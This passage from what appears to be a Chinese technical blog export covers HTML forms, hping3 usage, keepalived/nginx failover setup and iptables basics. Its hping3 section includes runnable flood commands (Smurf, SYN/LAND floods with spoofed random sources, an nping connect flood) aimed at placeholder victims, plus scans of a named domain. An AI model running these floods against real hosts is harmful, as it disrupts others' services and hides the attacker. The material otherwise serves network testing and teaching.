复选框 disabled表示禁用--&gt; &lt;input type=&quot;checkbox&quot; name=&quot;fu&quot; disabled=&quot;disabled&quot; value=&quot;money1&quot;/&gt; &lt;input type=&quot;checkbox&quot; name=&quot;fu&quot; disabled=&quot;disabled&quot; value=&quot;money2&quot; /&gt; &lt;input type=&quot;checkbox&quot; name=&quot;fu&quot; value=&quot;money3&quot; /&gt; &lt;input type=&quot;checkbox&quot; name=&quot;fu&quot; value=&quot;money4&quot; /&gt; 8, 下拉菜单 &lt;select&gt; &lt;option value =&quot;&quot;&gt;北京&lt;/option&gt; &lt;option value =&quot;上海&quot;&gt;上海&lt;/option&gt; &lt;option value =&quot;深圳&quot;&gt;深圳&lt;/option&gt; &lt;/select&gt;9, 多行文本 &lt;textarea rows=&quot;5&quot; cols=&quot;20&quot;&gt; &lt;/textarea&gt; 3,表单高级1234567891011121314151617181920212223242526272829303132333435361，表单字位焦&lt;fieldset id=&quot;&quot;&gt; &lt;legend&gt;信息页面&lt;/legend&gt; &lt;/fieldset&gt;功能:相当于一个方框，在字段中可以包含文本和其他元素，该元素用于对表单中的元素进行分组并在文档中区别标出文本，fieldset元素可以嵌套，在其内部可以在设置多个fieldset对象2, 字段级标题 &lt;legend&gt;信息页面&lt;/legend&gt;功能: legend元素可以在fieldset对象控制的方框内插入一个标题，legend元素必须是fieldset内的第一个元素3, 表单元素 (1) 上传文件框(文件域) &lt;!-- 上传文件框 multiple 表示上传多个文件--&gt; &lt;input type=&quot;file&quot; name=&quot;&quot; value=&quot;选择文件&quot; multiple=&quot;multiple&quot; /&gt; (2) 图像域 &lt;input type=&quot;image&quot; width=&quot;100&quot; height=&quot;100&quot; value=&quot;&quot; src=&quot;./img/favicon.ico&quot; /&gt; (3) 提示信息标签 &lt;label for=&quot;ti1&quot;&gt;信息&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;ti1&quot; value=&quot;&quot; placeholder=&quot;请输入信息&quot;/&gt; 功能: label 元素用来定义标签，为页面上的其他元素指定提示信息，要将label元素绑定到其他的控件上，可以将label元素的for属性设置为与该控件的id属性值相同。 label元素不会向用户呈现任何效果，不过，他为鼠标用户改进了可用性，如果在label元素内点击文本，就会触发此控件，就是说，当用户选择标签时，浏览器就会自动将焦点转到和标签相关的表达控件上。 (4)时间 &lt;!-- 时间标签 --&gt; &lt;input type=&quot;date&quot; name=&quot;&quot; /&gt; &lt;!-- 颜色 --&gt; &lt;input type=&quot;color&quot; name=&quot;&quot; /&gt; 电话号码 &lt;input type=&quot;tel&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; 等等还有很多，","link":"/2020/08/04/html%E5%92%8Ccss%E5%9F%BA%E7%A1%80/"},{"title":"hping3工具使用","text":"hping3工具使用 linux下直接yum安装 1yum install -y hping3 1.帮助文档12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485usage: hping3 host [options] -h --help show this help -v --version show version -c --count packet count #显示发送的数据包数目 -i --interval wait (uX for X microseconds, for example -i u1000)#设定数据包间隔时间uX中的X表示微秒 --fast alias for -i u10000 (10 packets for second)#等同于-i u10000 --faster alias for -i u1000 (100 packets for second)#等同于-i u1000 --flood sent packets as fast as possible. Don't show replies. #尽快发送数据包，不显示回复 -n --numeric numeric output #数字化输出 -q --quiet quiet #安静模式 -I --interface interface name (otherwise default routing interface)#指定网卡接口 -V --verbose verbose mode #详细模式 -D --debug debugging info #调试信息 -z --bind bind ctrl+z to ttl (default to dst port)#绑定ctrl+z到ttl（默认为目的端口） -Z --unbind unbind ctrl+z #取消绑定ctrl+z --beep beep for every matching packet received #接收到匹配数据包时蜂鸣提示Mode #模式选择 default mode TCP #默认TCP模式 -0 --rawip RAW IP mode #原始IP模式，发送的数据包带IP头 -1 --icmp ICMP mode #会发送IGMP应答报文， -2 --udp UDP mode -8 --scan SCAN mode.#扫描指定端口 Example: hping --scan 1-30,70-90 -S www.target.host -9 --listen listen modeIP -a --spoof spoof source address #源地址欺骗，伪造ip攻击，防火墙无法记录到真实IP，但同时自身无法接受到回应的包 --rand-dest random destionation address mode. see the man. #随机目的地址 --rand-source random source address mode. see the man. #随机源地址 -t --ttl ttl (default 64) #指定ttl值，默认64(ttl：生存时间值，包允许通过的最大网段数量，超过会被路由器丢弃) -N --id id (default random) #hping中的ID，默认随机 -W --winid use win* id byte ordering -r --rel relativize id field (to estimate host traffic) -f --frag split packets in more frag. (may pass weak acl) #设定数据包分段大小，将数据包拆成更多的碎片（默认16字节），测试对方的碎片处理能力 -x --morefrag set more fragments flag #设置很多的分段标志，泪滴攻击 -y --dontfrag set don't fragment flag #设置不分段标志，发送不可恢复的IP碎片，可用来检测对端的MTU（最大传输单元） -g --fragoff set the fragment offset #设置片偏移 -m --mtu set virtual mtu, implies --frag if packet size &gt; mtu #设置虚拟MTU值，大于MTU的时候分段 -o --tos type of service (default 0x00), try --tos help -G --rroute includes RECORD_ROUTE option and display the route buffer #记录IP路由，并显示路由缓存 --lsrr loose source routing and record route #松散源路由 --ssrr strict source routing and record route #严格源路由 -H --ipproto set the IP protocol field, only in RAW IP mode#设置IP协议字段，尽在RAW模式下使用ICMP #ICMP模式 -C --icmptype icmp type (default echo request) #ICMP类型（默认回显请求） -K --icmpcode icmp code (default 0) #ICMP代号（默认0） --force-icmp send all icmp types (default send only supported types)#强制ICMP类型 --icmp-gw set gateway address for ICMP redirect (default 0.0.0.0) #设置ICMP重定向网关地址（默认0.0.0。0） --icmp-ts Alias for --icmp --icmptype 13 (ICMP timestamp)#ICMP时间戳 --icmp-addr Alias for --icmp --icmptype 17 (ICMP address subnet mask) #ICMP子网地址 --icmp-help display help for others icmp optionsUDP/TCP -s --baseport base source port (default random) #设置源端口，默认随机 -p --destport [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec # -k --keep keep still source port #保持源端口 -w --win winsize (default 64) # -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) #设置伪造的TCP偏移量（取代tcp地址长度除以4） -Q --seqnum shows only tcp sequence number #仅显示tcp序列号 -b --badcksum (try to) send packets with a bad IP checksum many systems will fix the IP checksum sending the packet so you'll get bad UDP/TCP checksum instead. #尝试发送具有错误IP校验和的的数据包，许多系统会修复发送数据包的IP校验和，因此你会得到一个 错误的UDP/TCP校验和 -M --setseq set TCP sequence number #设置TCP序列号 -L --setack set TCP ack #设置TCP的ack -F --fin set FIN flag -S --syn set SYN flag -R --rst set RST flag -P --push set PUSH flag -A --ack set ACK flag -U --urg set URG flag -X --xmas set X unused flag (0x40) -Y --ymas set Y unused flag (0x80) --tcpexitcode use last tcp-&gt;th_flags as exit code #使用tcp-&gt;th_flags作为退出码 --tcp-mss enable the TCP MSS option with the given value #启动具有给定值的TCP MSS（最大报文段大小）选项 --tcp-timestamp enable the TCP timestamp option to guess the HZ/uptime #启用TCP时间戳来猜测HZ/uptime(运行时间？没有查到资料)Common #通用设置 -d --data data size (default is 0) #发送数据包大小，默认0 -E --file data from file #指定文件数据 -e --sign add 'signature' #添加签名 -j --dump dump packets in hex #转为16进制数据包 -J --print dump printable characters #转为可打印字符 -B --safe enable 'safe' protocol #启用安全协议 -u --end tell you when --file reached EOF and prevent rewind #指定EOF(文件结尾标志)防止倒回 -T --traceroute traceroute mode (implies --bind and --ttl 1) #traceroute模式 --tr-stop Exit when receive the first not ICMP in traceroute mode #在traceroute模式下当收到第一个不是ICMP时推出 --tr-keep-ttl Keep the source TTL fixed, useful to monitor just one hop #保持源TTL固定，仅监视一跳时很有用 --tr-no-rtt Don't calculate/show RTT information in traceroute mode #不要在traceroute模式下计算或显示RTT（TCP的往返时延）信息ARS packet description (new, unstable) #ARS（?没查到）包描述，新功能，不稳定 --apd-send Send the packet described with APD (see docs/APD.txt) #apd(?没查到) 2.扫描测试ICMP类似于ping，发送ICMP-echo，接收ICMP-reply 1hping3 -1 baidu.com 使用ICMP的traceroute类似于tracert(windows)和traceroute(linux)，他们使用ICMP数据包，ttl值每次加1 1hping3 --traceroute -V -1 baidu.com 检查端口将syn包发送给指定端口（这里是80），还可以控制从哪个本地端口开始扫描（5050） 1hping3 -V -S -p 80 -s 5050 0daysecurity.com 到指定端口的路由跟踪Hping3的一个不错的功能是您可以执行到指定端口的路由跟踪（traceroute），以观察包被阻塞的位置。可以通过在最后一个命令中添加–traceroute来完成。 1hping3 --traceroute -V -S -p 80 -s 5050 0daysecurity.com 其他类型的ICMP此示例发送ICMP地址掩码请求（类型17）。 1hping3 -c 1 -V -1 -C 17 0daysecurity.com 其他类型的端口扫描我们将尝试的第一种类型是FIN扫描。在TCP连接中，FIN标志用于启动连接关闭例程。如果我们未收到回复，则表示该端口已打开。通常，防火墙将RST + ACK数据包发送回以表明该端口已关闭。 1hping3 -c 1 -V -p 80 -s 5050 -F 0daysecurity.com ACK扫描此扫描可用于查看主机是否还活动（例如，当Ping被阻止时）。如果端口打开，这应该发送回RST响应。 1hping3 -c 1 -V -p 80 -s 5050 -A 0daysecurity.com Xmas扫描此扫描将序列号设置为零，并在数据包中设置URG + PSH + FIN标志。如果目标设备的TCP端口已关闭，则目标设备将发送TCP RST数据包作为答复。如果目标设备的TCP端口已打开，则目标将放弃TCP Xmas扫描，不发送答复。 1hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF 0daysecurity.com NULL扫描此扫描将序列号设置为零，并且在数据包中未设置任何标志。如果目标设备的TCP端口已关闭，则目标设备将发送TCP RST数据包作为答复。如果目标设备的TCP端口已打开，则目标将放弃TCP NULL扫描，不发送任何答复。 1hping3 -c 1 -V -p 80 -s 5050 -Y 0daysecurity.com 3.攻击Smurf攻击这是一种拒绝服务攻击，它通过欺骗性广播ping消息淹没目标系统，参考smurf攻击 1hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS DOS LAND攻击同样是DOS攻击的一种， 12345678910111213141516171819hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP--flood：尽快发送数据包。不显示回复。--rand-dest：随机目标地址模式。-V &lt;-详细-c --count：数据包计数-d --data：数据大小-S --syn：设置SYN标志-w --win：winsize（默认64）-p --destport [+] [+] &lt;port&gt;目标端口（默认为0）ctrl + z inc / dec-s --baseport：基本源端口（默认随机） DOS攻击1hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source VICTIM_IP -c:发送数据包的个数 -d:每个数据包的大小 -S:发送SYN数据包 -w：TCP window大小 -p：目标端口 –flood：尽可能快的发送包且不显示过程 –rand-source：使用随机的IP地址，也可用-a或–spoof隐藏主机名 SYN洪水攻击1hping3 -S --flood -V VICTIM_IP TCP连接攻击1nping --tcp-connect --rate=90000 -c 900000 -q VICTIM_IP 使用hping3进行DoS攻击：1hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testsite.com -c：发送数据包的个数 -d：每个数据包的大小 -S：发送SYN数据包 -w：TCP window大小 -p：目标端口，你可以指定任意端口 –flood：尽可能快的发送数据包 –rand-source：使用随机的IP地址，目标机器看到一堆ip，不能定位你的实际IP；也可以使用-a或–spoof隐藏主机名 简单的SYN洪水攻击： 1hping3 -S --flood -V testsite.com TCP连接攻击： 1nping --tcp-connect -rate=90000 -c 900000 -q testsite.com Hping 的缺点是不能修改发送包的MAC地址，因此在做地址欺骗的时候，IP地址虽然改变了，但是MAC地址并没有改变，还是本机的MAC地址。","link":"/2020/08/03/hping3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"title":"keepalived高可用主备","text":"1.keepalived高可用主备高可用集群 high availablity 双机热备 高可用常规结构图 12345678client www.itjiangshi.com --&gt;IP IP IP 心跳 主 －－－－－－－－－－&gt; 备 httpd httpd 目标：互为备份，实现高可用性。共享存储 心跳：主和备每隔一定时间会有一个通讯信息，称之为心跳；主要作用的就是备机监控主机是否alive（活着）； 心跳线：串口(console)或者RJ－45连接，一般普通网线就可以了 vip:virtual IP(虚拟ip),floating IP(浮动IP)；谁接管服务，就在谁那里；它就是上层程序要访问的IP，如果主崩溃，备会使用send_arp的形式抢到vip 资源:resources是会随着主备切换的。如VIP，httpd等 问题:如果做的是httpd的HA集群，那么这两个httpd家目录的内容要一致，方法有:1,rsync远程实时同步（目录实时同步） drbd(磁盘实时同步)2,共享存储(nfs,gfs2,ocfs2)3,分布式存储(mfs,hdfs,glusterfs,ceph)等等 什么东西可以做HA?只要能做成服务（或者能写成脚本启动的)，就能HA 脑裂： 当一些特殊情况，比如说心跳线（只有一根的情况）断了，主其实并没有崩溃，但是备机检测不到心跳，会认为主机崩溃，也会接管VIP。那么两边都会有VIP，脑裂就产生了。假如设定为：心跳间隔为2秒，死亡时间为1秒. （1秒内没有收到对方的心跳信号就认为死亡）。再或者，设定为：心跳间隔为2秒，死亡时间为4秒，但因为一些网络的原因，备机并没有在4秒内收到心跳，也会认为主挂掉，也会脑裂（brain-split） 商业产品：IBM PowerHA （原来称为HACMP） 开源软件：system-config-cluster #redhat配置集群的一个图形接口rhcs（red hat cluster suite) #rhel5,rhel6的主要集群套件，rhel7被pacemaker替代piranha #redhat图形配置接口,rhel7已经被keepalived替代heartbeat #linux-HA的项目，比较古老untralmonkey #lvs+heartbeat =========================================================================== 一. keepalived实现httpd的高可用实验目的： 通过keepalived搭建一个http高可用web服务器。分为主(master)备(backup)两台机器。client由宿主机担任。当主（master）出现问题，会自动切换到备（backup）。 (通过下面的例子举一反三，也就是说只要是能用命令启动的服务，你都可以用此思路来实现高可用） 12345678910 client 192.168.2.x | | VIP eth0:0 192.168.224.100 (准备环境时不要加此ip，它配置在keepalived里，keepalived启动后产生） 192.168.224.11 eth0－－－－－－－－－eth0 192.168.224.12 主 备 httpd httpd 第一步:（注意：是11和12机器，不是10）主备服务器都安装相关软件包，准备相关脚本 1yum install keepalived httpd httpd-devel -y vim /usr/local/httpd.sh(以下是脚本内容) 12345#!/bin/bashif [ ! -e /var/run/httpd/httpd.pid ];then systemctl start httpdfi (脚本内容结束) #内容是，假如httpd.pid文件不存在，就启动httpd。(脚本不能写错，会导致获取不了VIP) 1chmod 755 /usr/local/httpd.sh 上面的步骤是两台都要做的，下面命令的是两台分别做的（做两个不同主页方便测试） 12[root@master ~]# echo master &gt; /var/www/html/index.html[root@backup ~]# echo backup &gt; /var/www/html/index.html 第二步: master上配置 [root@master ~]# cat /etc/keepalived/keepalived.conf 123456789101112131415161718192021222324252627global_defs { router_id LVS_DEVEL}vrrp_script httpd_check { # 间隔 2 秒去执行脚本 script &quot;/usr/local/httpd.sh&quot; interval 2 }vrrp_instance VI_1 { state MASTER interface ens33 lvs_sync_daemon_interface ens33 virtual_router_id 51 # id 和备一样 priority 100 # 优先级比备高 advert_int 1 authentication { auth_type PASS auth_pass 1111 } track_script { # 执行上面的脚本路径 httpd_check } virtual_ipaddress { 192.168.224.100/24 # vip }} 第二步: backup上配置另外一台机器上的配置（client2） vim /etc/keepalived/keepalived.conf 123456789101112131415161718192021222324252627global_defs { router_id LVS_DEVEL}vrrp_script httpd_check { script &quot;/usr/local/httpd.sh&quot; interval 2 }vrrp_instance VI_1 { state BACKUP interface ens33 lvs_sync_daemon_interface ens33 virtual_router_id 51 priority 99 advert_int 1 authentication { auth_type PASS auth_pass 1111 } track_script { httpd_check } virtual_ipaddress { 192.168.224.100/24 }} Notes:把两个vrrp的state MASTER 改为 state BACKUPpriority 100 改为 priority 99 两台lvs调度器都启动keepalived服务 12systemctl restart keepalived systemctl enable keepalived 第四步:测试1，使用ip addr命令查看 主keepalived调度器看网卡是否获取到了VIP.只能使用ip addr命令查看，使用ifconfig命令是查看不到的. 最后在client curl 192.168.224.100 发现调度成功. 2, 在mater机器执行命令‘systemctl stop httpd’停掉httpd，在客户端curl 192.168.224.100发现还是继续调度master，在master执行tail -f /var/log/messages 会发现keepalived进行会自动启动httpd。说明检康检查也OK 3, 主keepalived调度器(master)reboot重启或直接断电再开机（保证静态IP，keepalived服务开机自动启动等）结果：会快速切换到备keepalived调度器(backup)。主lvs调度启动后，会failback回来（自动切换回backup）。 4,在主keepalived调度器上systemctl stop keepalived结果:正常切换 5,在主keepalived调度器删除vip ip address del 192.168.224.100/24 dev ens33结果:没有切换到备，整个架构完蛋. 需要重启keepalived才恢复。 Note:以上测试过程中，在主备切换后，使用’ip addr’命令可以看到VIP也相应进行由主(master)切换到了备(backup)。 ============================================================================ 二 使用keepalived搭建双网卡主机。目的：通常http服务器位于DMZ区域，处于安全需要后台的应用服务器处于防火墙后面并且在另外一个网段。这样就要求http主机要有双网卡，同时能够被互联网访问到，然后http也能够访问另外一个网段的应用程序服务器。 要求：在上一个实验的基础上完成本实验 12345678910111213 client 192.168.2.x | | VIP eth0:0 192.168.224.100 (准备环境时不要加此ip，它配置在keepalived里，keepalived启动后产生） VIP eth1:0 192.168.198.100 (准备环境时不要加此ip，它配置在keepalived里，keepalived启动后产生） 192.168.224.11 eth0－－－－－－－－－eth0 192.168.224.12 主 master 备backup 192.168.198.11 eth1－－－－－－－－－eth1 192.168.198.12 httpd httpd 接着上一个实验，完成本实验。 在192.168.224.11，192.168.224.12上增加host only (仅主机)网卡，IP段为192.168.198.x 设置IP，192.168.198.11, 192.168.198.12以下是设置步骤： 12345[root@client1 ~]# nmcli c sNAME UUID TYPE DEVICE ens33 7322f538-8192-4545-b25b-b51e6dd0a60b ethernet ens33 virbr0 36c2aeba-5cbc-49c2-875d-d8d77d020b7b bridge virbr0 有线连接 1 c4cca8ad-7e9f-3118-80af-9a24ad3278a2 ethernet -- 修改新增网卡配置名为ens38： 123nmcli c m &quot;有线连接 1&quot; con-name ens38修改IP为192.168.198.11/24nmcli c m ens38 ipv4.addresses 192.168.198.11/24 使上面的设置生效： 1nmcli c up ens38 删除动态IP 1ip a del 192.168.198.129/24 dev ens37 #dev 是网卡设备名ens37 修改配置 vim /etc/sysconfig/network-scripts/ifcfg-ens38…….BOOTPROTO=dhcp 改为 BOOTPROTO=static 固态IP…….重启网卡，：systemctl restart network 主服务器配置文件第二步: master上配置 1root@master ~]# vim /etc/keepalived/keepalived.conf 在文件尾部追加如下： 123456789101112131415vrrp_instance VI_2 { state MASTER interface ens37 lvs_sync_daemon_interface ens37 virtual_router_id 52 #id #不能和之前一样 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.198.100/24 }} 备服务器配置文件第二步: backup上配置另外一台机器上的配置（client2） 1root@backup ~]# vim /etc/keepalived/keepalived.conf 在文件尾部追加如下： 123456789101112131415vrrp_instance VI_2 { state BACKUP interface ens37 lvs_sync_daemon_interface ens37 virtual_router_id 52 priority 99 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.198.100/24 }} systemctl restart keepalivedsystemctl enable keepalived 工作中可以增加桥接网卡来实现外网访问vip地址========================================= 在上一个实验的基础上完成本实验： Nginx与HTTP都为高可用性集群，这样无论任一个Nginx和HTTP停机，整个架构都不会受影响。 Nginx ——– Nginx | | |Http ——– HTTP Web VIP：192.168.224.100web1: 192.168.224.11web2: 192.168.224.12 Nginx VIP：192.168.224.110Nginx1: 192.168.224.10Nginx2: 192.168.224.13 在两台Nginx服务器执行： yum -y install epel-releaseyum -y install nginx cat /etc/nginx/nginx.conf |grep -v ‘#’ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;include /usr/share/nginx/modules/*.conf;events { worker_connections 1024;}http { log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server { listen 80 default_server; listen [::]:80 default_server; server_name 192.168.224.110； root /usr/share/nginx/html; index index.php index.html; include /etc/nginx/default.d/*.conf; location / { proxy_pass http://192.168.224.100/; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } }} systemctl restart nginxsystemctl enable nginxlsof -i:80在两台Nginx上分别运行 curl 127.0.0.1，应该会返回虚拟IP 192.168.224.100上的HTTP结果。vim /usr/local/nginx.sh(以下是脚本内容) 12345#!/bin/bashif [ ! -e /run/nginx.pid ];then systemctl start nginxfi chmod 755 /usr/local/nginx.sh 在两台Nginx上安装Keepalived组件：第一步:主备服务器都安装相关软件包，准备相关脚本 yum install keepalived -y 第二步: master上配置先把原文件备份 cp /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.conf.bake [root@master ~]# cat /etc/keepalived/keepalived.conf 1234567891011121314151617181920212223242526global_defs { router_id LVS_DEVEL}vrrp_script nginx_check { script &quot;/usr/local/nginx.sh&quot; interval 2 }vrrp_instance VI_1 { state MASTER interface ens33 lvs_sync_daemon_interface ens33 virtual_router_id 55 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 }track_script { nginx_check } virtual_ipaddress { 192.168.224.110/24 }} 第二步: backup上配置另外一台机器上的配置（client3） 123456789101112131415161718192021222324252627global_defs { router_id LVS_DEVEL}vrrp_script nginx_check { script &quot;/usr/local/nginx.sh&quot; interval 2 }vrrp_instance VI_1 { state BACKUP interface ens33 lvs_sync_daemon_interface ens33 virtual_router_id 55 priority 99 advert_int 1 authentication { auth_type PASS auth_pass 1111 }track_script { nginx_check } virtual_ipaddress { 192.168.224.110/24 }} 两台lvs调度器都启动keepalived服务 12systemctl restart keepalived systemctl enable keepalived 验证一：基本功能在客户端访问 curl 192.168.224.110 可以输出 VIP 192.168.224.100的http结果。 验证二：高可用服务器关机web master，结果还是可以正常访问关机nginx master，结果还是可以正常访问","link":"/2020/08/03/keepalived%E9%AB%98%E5%8F%AF%E7%94%A8%E4%B8%BB%E5%A4%87/"},{"title":"iptables","text":"先运行如下语句获取国内IP网段，会保存为/root/china_ssr.txt 1wget -q --timeout=60 -O- 'http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest' | awk -F\\| '/CN\\|ipv4/ { printf(&quot;%s/%d\\n&quot;, $4, 32-log($5)/log(2)) }' &gt; /root/china_ssr.txt 防火墙 业界常见个人电脑防火墙软件瑞星 卡巴斯基 360 金山 江民 腾讯管家 诺顿 天网 …… 概念：在网络中，所谓“防火墙”，是指一种将内部网和公众访问网(如Internet)分开的方法，它实际上是一种隔离技术。防火墙是 在两个网络通讯时执行的一种访问控制尺度，它能允许你“同意”的人和数据进入你的网络，同时将你“不同意”的人和数据拒之门外，最大限度地阻止网络中的非法访问。 1.iptablescentos7以后都是默认firewalld 所以需要先停掉firewalld 12systemctl stop firewalldsystemctl disable firewalld 准备虚拟机，安装下面的软件包，并启动服务 123yum install iptables\\* -y #CentOS7已经自带，可以不用装。yum install -y iptables-services #自带需要下载这个，要不然不能启动iptables 查看相关软件包 123456rpm -qa |grep iptablesiptables-devel-1.4.21-28.el7.x86_64iptables-services-1.4.21-28.el7.x86_64iptables-utils-1.4.21-28.el7.x86_64iptables-1.4.21-28.el7.x86_64 启动服务 12345systemctl start iptables.servicesystemctl enable iptables.servicesystemctl status iptables.service iptables 基本概念 (4张表5链(chain)) filter : 用来进行包过滤： INPUT OUTPUT FORWARDnat : 用来网络地址转换： network address translation ,允许一个内网地址块，通过NAT转换成公网IP，实现对公网的访问，解决IP地址不足​ PREROUTING INPUT POSTROUTING OUTPUT​ 源地址发送数据–&gt; {PREROUTING–&gt;路由规则–&gt;POSTROUTING} –&gt;目的地址接收到数据 ​ POSTROUTING //路由判断之后的nat SNAT 内网访问外网 ​ PREROUTING //路由判断之前的nat DNAT 外网访问内网 mangle : 用来对数据包标记​ PREROUTING INPUT OUTPUT FORWARD POSTROUTINGraw : 对原始数据包的处理​ PREROUTING OUTPUT 12345678910111213Incoming / \\ Outgoing --&gt;[Routing ]---&gt;|FORWARD|-------&gt; [Decision] \\_____/ ^ | | | ____ ___ / \\ / \\ |OUTPUT| |INPUT| \\____/ \\___/ ^ | | ----&gt; Local Process ---- 1.iptables语法结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657iptables -h 列出帮助信息。iptables -t 类型 指令 chain名称 选项 参数 -t nat filter mangle raw指令 -A --append 追加一条规则，后接链名，默认是加到规则的最后面 -I --insert 插入规则 chain 编号 -D --delete 删除 chain 编号 -R --replace 替换 chain 编号 -F --flush 清空链规则 -N --new 自定义链 -X --delete-chain 删除自定义的空链 -P --policy 修改默认策略 chain -L 列出规则 -n 以数值显示 -v 显示统计数据，与－L一起用，看到的信息更多 -nL --line 查看信息，并显示行号chain(链) PREROUTING //路由判断之前的nat DNAT 外网访问内网 POSTROUTING //路由判断之后的nat SNAT 内网访问外网 INPUT 进 FORWARD 过滤经过防火墙的流量 OUTPUT 出 选项 参数 来源 -s --source 地址 子网 网段 192.168.224.11 192.168.224.32/27 192.168.224.0/24 -i 进接口 例如: -i ens37 目标 -d --destnaiton 地址 子网 网段 -o 出接口 例如: -o ens37 协议 -p tcp --dport --sport udp --dport --sport icmp --icmptype echo-request echo-reply动作 -j 后接动作 动作的分类： ACCEPT 接收数据包 DROP 丢弃数据包 REJECT 拒绝数据包，和DROP的区别就是REJECT会返回错误信息，DROP不会 MASQUERADE IP地址伪装，使用NAT转换成外网IP，可以PPP拔号（外网IP不固定情况） SNAT 源地址转换，它与MASQUERADE的区别是SNAT是接一个固定IP DNAT 目标地址转换 LOG 记录日志 nat操作实例 实现内网访问互联网 12iptables -t nat -A POSTROUTING -s 192.168.224.0/24 -o ens33 -j MASQUERADE只要源地址是192.168.224.0网段的 出去任何外网都做源地址转发。都能访问外网。 实现外网访问内网 123iptables -t nat -A PREROUTING -d 192.168.224.12 -i ens33 -p tcp --dport 8080 -j DNAT --to 172.30.0.3:80只要访问192.168.224.12的8080端口，就转发到内网的172.30.0.3:80端口 例1，列规则 1234567891011iptables -L #默认看的就是filter表iptables -t filter -Liptables -t nat -L iptables -t mangle -L iptables -t raw -L iptables -t filter -F 清除规则iptables -t nat -Fiptables -t mangle -F 这三张表有些默认的规则，我们把规则都清掉 例2,控制ping 192.168.224.x/24 －－－－－－》 192.168.224.10 客户端 服务器 《－－－－－－ 192.168.224.0/24网段ping本机，会被拒绝（客户端会收到拒绝信息)ping 是icmp协议，ssh,是tcp协议拒绝来自224.0网段的请求 1iptables -t filter -A INPUT -p icmp -s 192.168.224.0/24 -j REJECT 抛弃来自224.0网段的请求，不做回应 1iptables -t filter -A INPUT -p icmp -s 192.168.224.0/24 -j DROP 拒绝通往224.0网段的通讯 1iptables -t filter -A OUTPUT -p icmp -d 192.168.224.0/24 -j REJECT 抛弃通往224.0网段的通讯 1iptables -t filter -A OUTPUT -p icmp -d 192.168.224.0/24 -j DROP 参数D删除规则 1234iptables -t filter -D INPUT -p icmp -s 192.168.224.0/24 -j REJECTiptables -t filter -D INPUT -p icmp -s 192.168.224.0/24 -j DROPiptables -t filter -D OUTPUT -p icmp -d 192.168.224.0/24 -j REJECTiptables -t filter -D OUTPUT -p icmp -d 192.168.224.0/24 -j DROP 上面四种方法都可以控制拒绝192.168.224.0/24网段ping本机。前2种是不允许进入，后两种是不做回应。 1iptables -t filter -A INPUT -p icmp -j REJECT 如果不写-s或-d，默认代表所有人 扩展:我想实现所有人都ping不通我，但是192.168.224.11这个IP能ping通我 –提示:iptables的匹配规则:读取的顺序是从上往下一条一条匹配，匹配一条就不继续往下匹配，都没有匹配，则最后匹配默认策略 12iptables -t filter -A INPUT -p icmp -j REJECTiptables -t filter -A INPUT -p icmp -s 192.168.224.11 -j ACCEPT –此写法错误的,因为默认拒绝所有的策略在前边。 12345678 iptables -t filter -I INPUT -p icmp -s 192.168.224.11 -j ACCEPT -I 在最前面插入规则 iptables -t filter -A INPUT -p icmp -j REJECT正确写法，把第二条加到第一条前面。使用I参数加入到第一条规则之前。iptables -t filter -I INPUT 2 -p icmp -s 192.168.224.13 -j ACCEPT链后面接数字2，表示插入到原来第二条的上面，成为新的第2条 删除的方法：方法一： 1iptables -t filter -D INPUT -s 192.168.224.11 -p icmp -j ACCEPT 加的时候怎么写，删除时就要怎么写 A 参数换成 D就可以 方法二; 12iptables -L -n --line 在规则输出的格式上加入行号。 iptables -D INPUT 2 在INPUT组中，删除第二条规则。 在规则比较多或者不好写规则的情况下，可以先用–line或者–line-number列出行号，再用行号删除 方法三： 1iptables -F 直接清空filter表的所有规则 修改操作: 1iptables -t filter -R INPUT 3 -p icmp -s 192.168.224.100 -j ACCEPT 把filter表INPUT链第三行，修改成上面的命令的内容 例3，规则的保存与还原 123iptables-save &gt; /etc/sysconfig/iptables --将当前规则保存到这个文件，文件可以自定义iptables-restore &lt; /etc/sysconfig/iptables --把保存的规则还原回去 Note:/etc/sysconfig/iptables文件为默认保存文件，重启iptables服务会默认把此文件里的规则还原。当然也可以手工保存到另一个文件，就需要iptables-restore手工还原了。如果要永久保留此规则，则先iptables-save &gt; /etc/sysconfig/iptables 保存,再 systemctl enable iptables.service 做成开机自动启动就可以了如果你想做成开机自动空规则（没有任何iptables策略)，你可以把etc/sysconfig/iptables保存为空规则，然后systemctl enable iptables.service 例4，每个链的默认策略的修改 不要用Xshell 连接 想连接也可以，先把配置改下 192.168.224.1/32代表宿主机连上虚拟机的网关地址 12345iptables -A INPUT -p tcp -s 192.168.224.1/32 -m mulitiport --dports 22 -j ACCEPT iptables -A INPUT -p tcp -d 192.168.224.11/32 -m multiport --sports 22 -j ACCEPT iptables -A OUTPUT -p tcp -m state --state NEW,ESTABLISHED -j 